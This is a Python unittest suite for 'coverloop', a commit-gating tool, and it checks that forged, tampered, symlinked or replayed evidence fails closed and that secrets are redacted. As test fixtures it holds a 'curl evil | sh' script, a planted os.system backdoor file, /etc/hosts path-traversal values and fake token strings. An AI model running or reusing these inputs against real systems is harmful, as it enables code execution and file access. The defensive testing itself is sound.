#!/usr/bin/env python3
"""Tests for `coverloop` (init/attest/gate) against real temporary git repos.

Run from the repo root:  python3 -m unittest discover -s tests -v
No third-party dependencies.
"""
import hashlib
import json
import os
import subprocess
import sys
import tempfile
import unittest

CLI = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "bin", "coverloop")


def run(args, cwd):
    return subprocess.run(
        [sys.executable, CLI] + args, cwd=cwd, capture_output=True, text=True, timeout=60
    )


def sh(args, cwd):
    subprocess.run(args, cwd=cwd, capture_output=True, text=True, check=True)


class GateTestCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.repo = self.tmp.name
        sh(["git", "init", "-q", "-b", "main"], self.repo)
        sh(["git", "config", "user.email", "t@example.com"], self.repo)
        sh(["git", "config", "user.name", "tester"], self.repo)
        self.write("app.py", "print('v1')\n")
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "base"], self.repo)
        self.base_sha = self.git_out(["rev-parse", "HEAD"])

    def tearDown(self):
        self.tmp.cleanup()

    # helpers -------------------------------------------------------
    def write(self, rel, content):
        path = os.path.join(self.repo, rel)
        os.makedirs(os.path.dirname(path) or self.repo, exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)

    def commit(self, rel, content, msg="change"):
        self.write(rel, content)
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", msg], self.repo)
        return self.git_out(["rev-parse", "HEAD"])

    def git_out(self, args):
        return subprocess.run(
            ["git"] + args, cwd=self.repo, capture_output=True, text=True, check=True
        ).stdout.strip()

    def init_project(self, test_command="true"):
        r = run(["init", "--test-command", test_command], self.repo)
        self.assertEqual(r.returncode, 0, r.stderr)
        # Commit the scaffolding on its own, then move base past it, so later
        # "docs-only" assertions aren't polluted by .coverloop/config.json
        # (config changes are deliberately never waivable).
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "coverloop scaffolding"], self.repo)
        self.base_sha = self.git_out(["rev-parse", "HEAD"])

    def gate_json(self, extra=None):
        r = run(["gate", "--json"] + (extra or []), self.repo)
        try:
            return r.returncode, json.loads(r.stdout)
        except json.JSONDecodeError:
            self.fail(f"gate --json emitted non-JSON:\nstdout={r.stdout}\nstderr={r.stderr}")

    # fail-closed basics --------------------------------------------
    def test_gate_outside_git_repo_is_usage_error(self):
        with tempfile.TemporaryDirectory() as empty:
            r = run(["gate", "--tier", "L1"], empty)
            self.assertEqual(r.returncode, 2)

    def test_gate_without_tier_or_report_fails(self):
        r = run(["gate"], self.repo)
        self.assertEqual(r.returncode, 1)
        self.assertIn("no risk tier", r.stderr)

    def test_L1_without_any_report_fails(self):
        code, out = self.gate_json(["--tier", "L1"])
        self.assertEqual(code, 1)
        self.assertEqual(out["verdict"], "fail")

    def test_L0_passes_with_no_evidence(self):
        code, out = self.gate_json(["--tier", "L0"])
        self.assertEqual(code, 0)
        self.assertEqual(out["verdict"], "pass")

    def test_corrupt_report_fails_closed(self):
        self.init_project()
        sha = self.git_out(["rev-parse", "HEAD"])
        self.write(f".coverloop/reports/{sha}.json", "{not json")
        r = run(["gate", "--tier", "L1"], self.repo)
        self.assertEqual(r.returncode, 1)

    # attest + tiers -------------------------------------------------
    def test_L1_passes_after_green_tests(self):
        self.init_project(test_command="true")
        r = run(["attest", "--tier", "L1", "--tests"], self.repo)
        self.assertEqual(r.returncode, 0, r.stderr)
        code, out = self.gate_json()
        self.assertEqual(code, 0)
        self.assertEqual(out["tier"], "L1")

    def test_failing_tests_recorded_and_gate_fails(self):
        self.init_project(test_command="false")
        r = run(["attest", "--tier", "L1", "--tests"], self.repo)
        self.assertEqual(r.returncode, 1)  # attest surfaces the red run
        code, out = self.gate_json()
        self.assertEqual(code, 1)
        self.assertEqual(out["verdict"], "fail")

    def test_L2_requires_codex(self):
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        code, out = self.gate_json()
        self.assertEqual(code, 1)
        failing = [c["check"] for c in out["checks"] if c["status"] != "pass"]
        self.assertEqual(failing, ["codex"])
        run(["attest", "--codex", "pass"], self.repo)
        code, _ = self.gate_json()
        self.assertEqual(code, 0)

    def test_L2_open_codex_findings_fail(self):
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass", "--codex-findings", "2"], self.repo)
        code, out = self.gate_json()
        self.assertEqual(code, 1)
        self.assertIn("open findings: 2", json.dumps(out))

    def test_L3_requires_everything(self):
        self.init_project()
        run(["attest", "--tier", "L3", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)
        run(["attest", "--glm", "pass"], self.repo)
        code, out = self.gate_json()
        self.assertEqual(code, 1)  # human gate still missing
        failing = [c["check"] for c in out["checks"] if c["status"] != "pass"]
        self.assertEqual(failing, ["human_gate"])
        r = run(["attest", "--approve", "--approver", "daniel"], self.repo)
        self.assertEqual(r.returncode, 0, r.stderr)
        code, out = self.gate_json()
        self.assertEqual(code, 0)
        self.assertEqual(out["verdict"], "pass")

    def test_approve_without_approver_is_rejected(self):
        self.init_project()
        run(["attest", "--tier", "L3", "--tests"], self.repo)
        r = run(["attest", "--approve"], self.repo)
        self.assertEqual(r.returncode, 2)

    # staleness ------------------------------------------------------
    def test_new_commit_invalidates_old_evidence(self):
        self.init_project()
        run(["attest", "--tier", "L3", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)
        run(["attest", "--glm", "pass"], self.repo)
        run(["attest", "--approve", "--approver", "daniel"], self.repo)
        code, _ = self.gate_json()
        self.assertEqual(code, 0)
        self.commit("app.py", "print('v2')  # sneaky post-approval change\n")
        r = run(["gate", "--tier", "L3"], self.repo)
        self.assertEqual(r.returncode, 1)

    def test_report_sha_mismatch_fails(self):
        self.init_project()
        run(["attest", "--tier", "L1", "--tests"], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        path = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
        with open(path, encoding="utf-8") as f:
            data = json.load(f)
        data["commit"] = "0" * 40  # forged binding
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f)
        r = run(["gate", "--tier", "L1"], self.repo)
        self.assertEqual(r.returncode, 1)

    # the committed-evidence flow (Codex P0 regression) ---------------
    def test_committed_report_still_gates_the_change(self):
        """attest -> COMMIT the report -> gate must pass at the new HEAD.
        This is the CI flow: the report travels inside the PR."""
        self.init_project()
        self.commit("app.py", "print('v2')\n")
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "evidence"], self.repo)  # new HEAD
        code, out = self.gate_json()
        self.assertEqual(code, 0, out)
        self.assertEqual(out["verdict"], "pass")

    def test_code_change_after_committed_evidence_fails(self):
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "evidence"], self.repo)
        code, _ = self.gate_json()
        self.assertEqual(code, 0)
        self.commit("app.py", "print('sneaky v3')\n")  # code after evidence
        r = run(["gate", "--tier", "L2"], self.repo)
        self.assertEqual(r.returncode, 1)

    def test_attest_inherits_evidence_across_evidence_commits(self):
        """Multi-step L3: attest tests, commit, attest reviews later —
        earlier evidence must carry forward, not be lost."""
        self.init_project()
        run(["attest", "--tier", "L3", "--tests"], self.repo)
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "evidence: tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)
        run(["attest", "--glm", "pass"], self.repo)
        run(["attest", "--approve", "--approver", "daniel"], self.repo)
        code, out = self.gate_json()
        self.assertEqual(code, 0, out)
        checks = {c["check"]: c["status"] for c in out["checks"]}
        self.assertEqual(checks.get("tests"), "pass")  # inherited, not lost

    # config is required for non-L0 (Codex P1 regression) -------------
    def test_missing_config_fails_non_L0(self):
        run(["attest", "--tier", "L1"], self.repo)  # report without init
        r = run(["gate", "--tier", "L1"], self.repo)
        self.assertEqual(r.returncode, 1)
        self.assertIn("config", r.stdout + r.stderr)

    def test_corrupt_config_fails_non_L0(self):
        self.init_project()
        run(["attest", "--tier", "L1", "--tests"], self.repo)
        self.write(".coverloop/config.json", "{broken")
        r = run(["gate", "--tier", "L1"], self.repo)
        self.assertEqual(r.returncode, 1)

    # malformed reports fail every tier (Codex P2 regression) ---------
    def test_corrupt_report_fails_even_at_L0(self):
        self.init_project()
        sha = self.git_out(["rev-parse", "HEAD"])
        self.write(f".coverloop/reports/{sha}.json", "{not json")
        r = run(["gate", "--tier", "L0"], self.repo)
        self.assertEqual(r.returncode, 1)

    # --ci works alongside --json (Codex P2 regression) ---------------
    def test_ci_annotations_survive_json_mode(self):
        self.init_project()
        r = run(["gate", "--tier", "L2", "--ci", "--json"], self.repo)
        self.assertEqual(r.returncode, 1)
        json.loads(r.stdout)  # stdout must stay pure JSON
        self.assertIn("::error", r.stderr)

    # captured (tool-produced) evidence ------------------------------
    def test_codex_run_captures_hashed_transcript(self):
        self.init_project()
        r = run(["attest", "--tier", "L2", "--codex", "pass",
                 "--codex-run", "printf 'CLEAN: no findings\\n'"], self.repo)
        self.assertEqual(r.returncode, 0, r.stderr)
        sha = self.git_out(["rev-parse", "HEAD"])
        with open(os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")) as f:
            rep = json.load(f)
        self.assertEqual(rep["codex"]["source"], "captured")
        self.assertIn("output_sha256", rep["codex"])
        self.assertEqual(rep["codex"]["command"], "printf 'CLEAN: no findings\\n'")
        # the transcript log exists and its hash matches what was recorded
        log = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.codex.log")
        self.assertTrue(os.path.exists(log))
        with open(log, "rb") as f:
            digest = hashlib.sha256(f.read()).hexdigest()
        self.assertEqual(digest, rep["codex"]["output_sha256"])

    def test_gate_detail_distinguishes_captured_from_self_attested(self):
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)  # bare claim
        _, out = self.gate_json()
        codex_detail = [c["detail"] for c in out["checks"] if c["check"] == "codex"][0]
        self.assertIn("self-attested", codex_detail)
        run(["attest", "--codex", "pass", "--codex-run", "echo ok"], self.repo)
        _, out = self.gate_json()
        codex_detail = [c["detail"] for c in out["checks"] if c["check"] == "codex"][0]
        self.assertIn("captured", codex_detail)

    def test_run_without_verdict_is_rejected(self):
        self.init_project()
        r = run(["attest", "--tier", "L2", "--codex-run", "echo hi"], self.repo)
        self.assertEqual(r.returncode, 2)

    def test_require_captured_rejects_self_attested(self):
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)  # self-attested
        self.assertEqual(self.gate_json()[0], 0)                       # passes normally
        code, out = self.gate_json(["--require-captured"])
        self.assertEqual(code, 1)                                      # but not with the flag
        self.assertIn("SELF-ATTESTED", json.dumps(out))

    def test_require_captured_accepts_captured(self):
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass", "--codex-run", "echo reviewed"], self.repo)
        code, _ = self.gate_json(["--require-captured"])
        self.assertEqual(code, 0)

    def _forge_source_captured(self, sha, sha256="deadbeef"):
        p = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
        with open(p) as f:
            rep = json.load(f)
        rep["codex"]["source"] = "captured"
        rep["codex"]["output_file"] = f".coverloop/reports/{sha}.codex.log"
        rep["codex"]["output_sha256"] = sha256
        with open(p, "w") as f:
            json.dump(rep, f)

    def test_forged_captured_without_transcript_is_rejected(self):
        """source:'captured' with no real transcript must FAIL even without
        --require-captured (Codex v2.6.2 P1: the label must not be a lie)."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)  # self-attested
        sha = self.git_out(["rev-parse", "HEAD"])
        self._forge_source_captured(sha)  # flip to 'captured', bogus hash, no log
        r = run(["gate", "--tier", "L2"], self.repo)
        self.assertEqual(r.returncode, 1)
        r = run(["gate", "--tier", "L2", "--require-captured"], self.repo)
        self.assertEqual(r.returncode, 1)

    def test_tampered_transcript_is_rejected(self):
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass", "--codex-run", "echo original"], self.repo)
        self.assertEqual(self.gate_json()[0], 0)  # valid capture passes
        sha = self.git_out(["rev-parse", "HEAD"])
        log = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.codex.log")
        with open(log, "a") as f:
            f.write("TAMPERED AFTER ATTEST\n")  # bytes change -> hash mismatch
        r = run(["gate", "--tier", "L2"], self.repo)
        self.assertEqual(r.returncode, 1)

    def test_captured_path_traversal_is_rejected(self):
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        p = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
        with open(p) as f:
            rep = json.load(f)
        rep["codex"]["source"] = "captured"
        rep["codex"]["output_file"] = "../../../../etc/hosts"  # escape attempt
        rep["codex"]["output_sha256"] = "0" * 64
        with open(p, "w") as f:
            json.dump(rep, f)
        r = run(["gate", "--tier", "L2"], self.repo)
        self.assertEqual(r.returncode, 1)

    def test_captured_replay_of_other_commit_log_rejected(self):
        """A report may only cite THIS commit's transcript — pointing at a real
        log named for a different commit (replay) is rejected (Codex round-2)."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass", "--codex-run", "echo genuine review"], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        rdir = os.path.join(self.repo, ".coverloop", "reports")
        other = "0123456789abcdef0123456789abcdef01234567"
        with open(os.path.join(rdir, f"{sha}.codex.log"), "rb") as f:
            data = f.read()
        with open(os.path.join(rdir, f"{other}.codex.log"), "wb") as f:
            f.write(data)  # identical content -> identical hash, only the NAME differs
        p = os.path.join(rdir, f"{sha}.json")
        with open(p) as f:
            rep = json.load(f)
        rep["codex"]["output_file"] = f".coverloop/reports/{other}.codex.log"
        with open(p, "w") as f:
            json.dump(rep, f)
        r = run(["gate", "--tier", "L2"], self.repo)
        self.assertEqual(r.returncode, 1)

    def test_captured_symlink_escape_rejected(self):
        """A transcript that is a symlink pointing outside reports/ is rejected
        even if its target hashes to the recorded digest (Codex round-2)."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass", "--codex-run", "echo real review"], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        log = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.codex.log")
        outside = os.path.join(self.repo, "outside.txt")
        with open(log) as f:
            content = f.read()
        with open(outside, "w") as f:
            f.write(content)  # same content -> hash still matches
        os.remove(log)
        os.symlink(outside, log)
        r = run(["gate", "--tier", "L2"], self.repo)
        self.assertEqual(r.returncode, 1)

    def test_failed_reviewer_capture_is_rejected(self):
        """An honest user whose reviewer command FAILS (nonzero exit) must not
        have that error transcript accepted as evidence (Codex round-4)."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        r = run(["attest", "--tier", "L2", "--codex", "pass",
                 "--codex-run", "echo boom; exit 7"], self.repo)
        self.assertIn("exited 7", r.stderr)  # attest warns
        code, out = self.gate_json()
        self.assertEqual(code, 1)  # gate rejects even without --require-captured
        code, _ = self.gate_json(["--require-captured"])
        self.assertEqual(code, 1)

    def test_captured_reports_dir_symlink_rejected(self):
        """If .coverloop/reports itself is a symlink to an external dir, the
        transcript is off-tree and must be rejected (Codex round-3)."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass", "--codex-run", "echo real review"], self.repo)
        rdir = os.path.join(self.repo, ".coverloop", "reports")
        ext = tempfile.mkdtemp()
        for fn in os.listdir(rdir):
            with open(os.path.join(rdir, fn), "rb") as f:
                d = f.read()
            with open(os.path.join(ext, fn), "wb") as f:
                f.write(d)
        for fn in os.listdir(rdir):
            os.remove(os.path.join(rdir, fn))
        os.rmdir(rdir)
        os.symlink(ext, rdir)  # reports/ now points off-tree
        try:
            r = run(["gate", "--tier", "L2"], self.repo)
            self.assertEqual(r.returncode, 1)
        finally:
            os.remove(rdir)

    def test_captured_survives_attest_after_evidence_commit(self):
        """The inheritance re-bind keeps captured evidence valid: capture codex,
        commit the evidence, attest tests at the new HEAD, gate --require-captured."""
        self.init_project()
        run(["attest", "--tier", "L2", "--codex", "pass",
             "--codex-run", "echo reviewed"], self.repo)
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "evidence"], self.repo)
        run(["attest", "--tests"], self.repo)  # inherits codex + re-binds its log
        code, out = self.gate_json(["--require-captured"])
        self.assertEqual(code, 0, out)

    # docs-only waiver ----------------------------------------------
    def test_L1_docs_only_diff_waives_tests(self):
        self.init_project()
        self.commit("README.md", "# docs change only\n")
        code, out = self.gate_json(["--tier", "L1", "--base", self.base_sha])
        # no report exists at all -> still fails closed (report required)
        self.assertEqual(code, 1)
        run(["attest", "--tier", "L1"], self.repo)  # report with no test run
        code, out = self.gate_json(["--tier", "L1", "--base", self.base_sha])
        self.assertEqual(code, 0)
        self.assertIn("waived", json.dumps(out))

    def test_L1_code_diff_does_not_get_waiver(self):
        self.init_project()
        self.commit("app.py", "print('v2')\n")
        run(["attest", "--tier", "L1"], self.repo)  # no test run recorded
        code, out = self.gate_json(["--tier", "L1", "--base", self.base_sha])
        self.assertEqual(code, 1)

    def test_config_change_is_never_waived_but_reports_are(self):
        self.init_project()
        # a VALID committed report artifact (<40-hex>.json) rides along -> waivable
        self.commit(".coverloop/reports/" + ("a" * 40) + ".json", "{}", "carry an old report")
        self.commit("README.md", "# docs\n")
        run(["attest", "--tier", "L1"], self.repo)
        code, _ = self.gate_json(["--tier", "L1", "--base", self.base_sha])
        self.assertEqual(code, 0)
        # but touching the gate's own config always demands the test gate
        self.commit(".coverloop/config.json",
                    json.dumps({"schema": "coverloop-config/v1", "test_command": "true"}))
        run(["attest", "--tier", "L1"], self.repo)
        code, _ = self.gate_json(["--tier", "L1", "--base", self.base_sha])
        self.assertEqual(code, 1)

    # ---- Phase-A audit regressions (P0/P1 fail-opens) ----
    def test_pinned_tier_is_a_floor_not_an_override(self):
        """P0 #1: an L3 report gated with a LOWER --tier/--min-tier must still
        require glm + human (floor, not override)."""
        self.init_project()
        run(["attest", "--tier", "L3", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)  # tests+codex only, no glm/human
        # bare gate (report says L3) -> FAIL (missing glm+human)
        self.assertEqual(self.gate_json()[0], 1)
        # the shipped CI recipe's downgrade attempt must NOT lower it
        for lower in ("L0", "L1", "L2"):
            code, out = self.gate_json(["--tier", lower])
            self.assertEqual(code, 1, f"--tier {lower} wrongly downgraded L3")
            failing = {c["check"] for c in out["checks"] if c["status"] != "pass"}
            self.assertTrue({"glm", "human_gate"} & failing)

    def test_min_tier_raises_the_floor(self):
        """--min-tier can only RAISE: an L1 report gated --min-tier L2 needs codex."""
        self.init_project()
        run(["attest", "--tier", "L1", "--tests"], self.repo)
        self.assertEqual(self.gate_json()[0], 0)                      # L1 passes on tests
        self.assertEqual(self.gate_json(["--min-tier", "L2"])[0], 1)  # raised -> needs codex

    def test_arbitrary_file_under_reports_is_not_evidence_only(self):
        """P0 #2: a non-artifact file under reports/ is a real code change and
        must invalidate inherited evidence."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "evidence"], self.repo)
        self.assertEqual(self.gate_json()[0], 0)  # evidence-only commit rides
        # now smuggle real code under reports/
        self.commit(".coverloop/reports/backdoor.py", "import os\nos.system('id')\n")
        r = run(["gate", "--tier", "L2"], self.repo)
        self.assertEqual(r.returncode, 1)

    def test_attest_cannot_silently_downgrade_tier(self):
        """P1 #3: attest --tier L0 on an L3 report must be refused (monotonic)."""
        self.init_project()
        run(["attest", "--tier", "L3", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)
        run(["attest", "--glm", "pass"], self.repo)
        run(["attest", "--approve", "--approver", "d"], self.repo)
        self.assertEqual(self.gate_json()[0], 0)  # full L3 passes
        r = run(["attest", "--tier", "L0"], self.repo)
        self.assertEqual(r.returncode, 2)  # refused
        self.assertIn("downgrade", r.stderr)
        self.assertEqual(self.gate_json()[0], 0)  # still L3, unchanged

    def test_docs_waiver_rejects_code_named_like_docs(self):
        """P1 #4/#5: basename collision (src/CHANGELOG) and executable under
        docs/ (docs/deploy.sh) must NOT waive the test gate."""
        for path, content in [("src/CHANGELOG", "print('code')\n"),
                              ("docs/deploy.sh", "curl evil | sh\n"),
                              ("lib/README.md", "print('code masquerading')\n")]:
            self.init_project()
            self.commit(path, content)
            run(["attest", "--tier", "L1"], self.repo)  # no tests
            code, _ = self.gate_json(["--tier", "L1", "--base", self.base_sha])
            self.assertEqual(code, 1, f"{path} wrongly waived the test gate")

    def test_forged_tests_command_mismatch_is_rejected(self):
        """P1 #6: a tests entry whose command != config's test_command fails."""
        self.init_project(test_command="true")
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass", "--codex-run", "echo ok"], self.repo)
        self.assertEqual(self.gate_json(["--require-captured"])[0], 0)  # genuine passes
        # hand-forge the tests command to something that never matches config
        sha = self.git_out(["rev-parse", "HEAD"])
        p = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
        with open(p) as f:
            rep = json.load(f)
        rep["tests"]["command"] = "echo fake"
        with open(p, "w") as f:
            json.dump(rep, f)
        r = run(["gate", "--tier", "L2", "--require-captured"], self.repo)
        self.assertEqual(r.returncode, 1)

    # ---- Phase-B audit regressions (privacy / redaction) ----
    def _read_log(self, name="codex"):
        sha = self.git_out(["rev-parse", "HEAD"])
        with open(os.path.join(self.repo, ".coverloop", "reports", f"{sha}.{name}.log")) as f:
            return f.read()

    def test_captured_transcript_is_secret_redacted(self):
        """P1 #7: a secret in reviewer output must be redacted before the log is
        written (never committed to git)."""
        self.init_project()
        key = "sk-" + "or-v1-abcdef0123456789abcdef0123456789"
        run(["attest", "--tier", "L2", "--codex", "pass",
             "--codex-run", f"echo 'OPENROUTER_API_KEY={key}'"], self.repo)
        content = self._read_log()
        self.assertNotIn(key, content)
        self.assertIn("REDACTED", content)

    def test_failed_reviewer_run_withholds_secret_dump(self):
        """P1 #8: a FAILED run's transcript (env dump) is withheld, not committed."""
        self.init_project()
        ant = "sk-" + "ant-api03-" + "X" * 24
        dburl = "postgres://u:" + "p4ss@h/db"
        run(["attest", "--tier", "L2", "--codex", "pass", "--codex-run",
             f"echo 'DATABASE_URL={dburl}'; echo {ant}; exit 3"], self.repo)
        content = self._read_log()
        self.assertNotIn("p4ss@h", content)
        self.assertNotIn(ant[3:15], content)
        self.assertIn("withheld", content)

    def test_reviewer_command_string_is_redacted(self):
        """P2 #16: a secret on the reviewer command line is redacted in the report."""
        self.init_project()
        proj = "sk-" + "proj-" + "A" * 24
        run(["attest", "--tier", "L2", "--codex", "pass",
             "--codex-run", f"echo hi --token {proj}"], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        with open(os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")) as f:
            rep = json.load(f)
        self.assertNotIn(proj[3:15], rep["codex"]["command"])

    def test_non_utf8_reviewer_output_does_not_crash(self):
        """P1 #10: non-UTF-8 reviewer output records cleanly instead of crashing."""
        self.init_project()
        r = run(["attest", "--tier", "L2", "--codex", "pass",
                 "--codex-run", r"printf '\xff\xfe bad bytes'"], self.repo)
        self.assertEqual(r.returncode, 0, r.stderr)

    def test_secret_filter_covers_common_token_shapes(self):
        """P1 #9: scan() + redact() catch GitHub/AWS/Slack/Google/bearer tokens."""
        import importlib.util
        fp = os.path.join(os.path.dirname(CLI), "glm_secret_filter.py")
        spec = importlib.util.spec_from_file_location("gsf_test", fp)
        gsf = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(gsf)
        for secret in ["ghp_" + "a" * 36, "AKIA" + "IOSFODNN7EXAMPLE",
                       "xoxb-" + "123456789012-abcdefghijklmno", "AIza" + "b" * 35,
                       "Authorization: Bearer " + "x" * 30]:
            self.assertTrue(gsf.scan(secret), f"scan missed {secret[:12]}")
            self.assertIn("REDACTED", gsf.redact(secret), f"redact missed {secret[:12]}")

    def test_config_base_cannot_waive_tests_on_code_change(self):
        """Codex round-3 P1: default_base ships inside the PR, so it must not
        be trusted to compute the waiver diff. A code change + a report with no
        tests must FAIL when gated with no explicit --base (fail closed)."""
        self.init_project()
        # commit A: real code change + a config that (historically) pointed the
        # base at itself; the report records NO test run
        self.write("app.py", "print('unshipped code change')\n")
        self.write(".coverloop/config.json", json.dumps(
            {"schema": "coverloop-config/v1", "test_command": "true",
             "default_base": "HEAD~1"}))  # attacker-controlled hint — must be ignored
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "A: code + evil config"], self.repo)
        run(["attest", "--tier", "L1"], self.repo)  # note: no --tests
        sh(["git", "add", ".coverloop/reports"], self.repo)
        sh(["git", "commit", "-qm", "B: report only"], self.repo)
        # No trusted --base -> waiver cannot apply -> tests required -> FAIL
        r = run(["gate", "--tier", "L1"], self.repo)
        self.assertEqual(r.returncode, 1)
        # And with the REAL base, the code change is visible -> also FAIL
        r = run(["gate", "--tier", "L1", "--base", self.base_sha], self.repo)
        self.assertEqual(r.returncode, 1)

    def test_rename_into_docs_cannot_smuggle_code_past_waiver(self):
        """With diff.renames on, a code file renamed into docs/ must NOT
        count as docs-only (Codex round-2 P1 regression)."""
        self.init_project()
        sh(["git", "config", "diff.renames", "true"], self.repo)
        os.makedirs(os.path.join(self.repo, "docs"), exist_ok=True)
        sh(["git", "mv", "app.py", "docs/app.md"], self.repo)
        sh(["git", "commit", "-qm", "sneaky rename"], self.repo)
        run(["attest", "--tier", "L1"], self.repo)  # no test run recorded
        code, _ = self.gate_json(["--tier", "L1", "--base", self.base_sha])
        self.assertEqual(code, 1)

    def test_docs_only_waiver_never_applies_to_L2(self):
        """P1 #11: assert the SPECIFIC tests check fails at L2 (not just
        returncode==1), so a regression that leaks the waiver to L2 is caught
        even though the missing codex check would also fail the gate."""
        self.init_project()
        self.commit("README.md", "# docs\n")
        run(["attest", "--tier", "L2", "--codex", "pass"], self.repo)  # codex passes
        code, out = self.gate_json(["--tier", "L2", "--base", self.base_sha])
        self.assertEqual(code, 1)
        tests_check = [c for c in out["checks"] if c["check"] == "tests"][0]
        self.assertEqual(tests_check["status"], "FAIL")  # waiver must NOT apply at L2

    def test_report_json_symlink_is_rejected(self):
        """P2 #14: a report JSON reached through a symlink is off-tree evidence."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)
        self.assertEqual(self.gate_json()[0], 0)  # valid report passes
        sha = self.git_out(["rev-parse", "HEAD"])
        rp = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
        ext = os.path.join(self.repo, "offtree.json")
        os.rename(rp, ext)
        os.symlink(ext, rp)  # report is now a symlink
        r = run(["gate", "--tier", "L2"], self.repo)
        self.assertEqual(r.returncode, 1)

    def test_artifact_regex_rejects_disguised_extensions(self):
        """Codex v2.7 review: <sha>.py.log / <sha>.pwn.json are NOT artifacts,
        so they can't ride as evidence-only."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "evidence"], self.repo)
        self.assertEqual(self.gate_json()[0], 0)
        self.commit(".coverloop/reports/" + ("b" * 40) + ".py.log", "import os\n")
        self.assertEqual(run(["gate", "--tier", "L2"], self.repo).returncode, 1)

    def test_no_configured_test_command_fails_closed(self):
        """Release-gate review: gate must NOT pass a forged tests:pass when the
        config has no test_command (None was wrongly treated as a match)."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)
        self.assertEqual(self.gate_json()[0], 0)  # normally passes
        # remove test_command from config, keep a forged passing tests entry
        self.write(".coverloop/config.json", json.dumps({"schema": "coverloop-config/v1"}))
        r = run(["gate", "--tier", "L2"], self.repo)
        self.assertEqual(r.returncode, 1)

    def test_secret_named_assignment_is_redacted(self):
        """Release-gate review B: a secret-NAMED assignment with an unknown-shape
        value (VERCEL_TOKEN=...) is redacted in a captured transcript."""
        self.init_project()
        run(["attest", "--tier", "L2", "--codex", "pass",
             "--codex-run", "echo 'VERCEL_TOKEN=plainUnmatchedValue123'"], self.repo)
        content = self._read_log()
        self.assertNotIn("plainUnmatchedValue123", content)
        self.assertIn("REDACTED", content)

    def test_inheritance_drops_forged_transcript_path(self):
        """Release-gate review A: a forged ancestor report pointing output_file
        at an arbitrary file must NOT be copied into the tree on inheritance."""
        self.init_project()
        run(["attest", "--tier", "L2", "--codex", "pass", "--codex-run", "echo reviewed"], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        p = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
        with open(p) as f:
            rep = json.load(f)
        rep["codex"]["output_file"] = "/etc/hosts"  # forged: arbitrary file
        with open(p, "w") as f:
            json.dump(rep, f)
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "evidence with forged path"], self.repo)
        run(["attest", "--tests"], self.repo)  # inheritance re-bind
        sha2 = self.git_out(["rev-parse", "HEAD"])
